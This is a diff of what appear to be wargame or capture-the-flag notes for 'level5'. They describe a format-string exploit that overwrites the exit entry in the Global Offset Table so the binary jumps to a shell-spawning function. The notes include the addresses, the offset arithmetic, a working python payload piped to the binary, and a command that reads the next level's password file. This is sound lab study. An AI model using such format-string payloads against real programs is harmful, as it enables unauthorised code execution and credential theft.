@@ -1,22 +1,24 @@
 - attack: format string exploitation using Global Offset Table
-- binary behavior: fgets argument and send it to printf, if global argument = 64 run the shell
-- targeted functions: v, o and main
-- vulnerability in v: printf() without argument (Bugs section in printf man)
+- binary behavior: fgets argument and send it to printf
+- targeted functions: n, o and main
+- vulnerability in n: printf() without argument (Bugs section in printf man)
+- vulnerability in o: no ASLR (address space layout realisation)
 - defense1: fget
 - defense2: function o with system call is non-called
 
 Method:
 - find the address of exit call in n
 - find the address of o function
-- find the exit (buffer) call position 
-- write o function address instead of exit address through buffer
+- find the exit call position 
+- write o function address instead of exit address through argument buffer
  
 Info:
-- positon of exit (buffer) in stack - 4
-- 134513828 - same in decimal
-- 080484a4 - address of o function
+- positon of exit function (buffer) in stack - 4
 - 08049838 - address of exit function
 - same in hex - \x38\x98\x04\x08
+
+- 080484a4 - address of o function
+- 134513828 - same in decimal
 
 - offset code structure: 134513828 = 134513824 (o address) - 4 (buffer address)
 
@@ -24,11 +26,14 @@ Info:
 Code:
 objdump -d ./level5 # get the o function address
 objdump -R level5 | grep exit # get the exit address
-(python -c 'print "0000" + " %p" * 15'; cat) | ./level5
-$(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; )
-python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/ex ;  cat /tmp/ex - | ./level5
-
+(python -c 'print "0000" + " %p" * 4'; cat) | ./level5
+python -c 'print "\x38\x98\x04\x08" + "%134513824u" + "%4$n"' > /tmp/ex ;  cat /tmp/ex - | ./level5
 cat /home/user/level6/.pass
+
+QA:
+- why we can rewrite exit function
+- <exit@plt> from n calls real 'exit' address from GOT. GOT keeps addresses of libc library. We can change the value inside GOT by the new address
+
 Functions
 
 08048504 <main>:
@@ -65,3 +70,7 @@ Functions
  80484b6:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
  80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>
 
+ 080483d0 <exit@plt>:
+ 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838 # exploit
+ 80483d6:       68 28 00 00 00          push   $0x28
+ 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
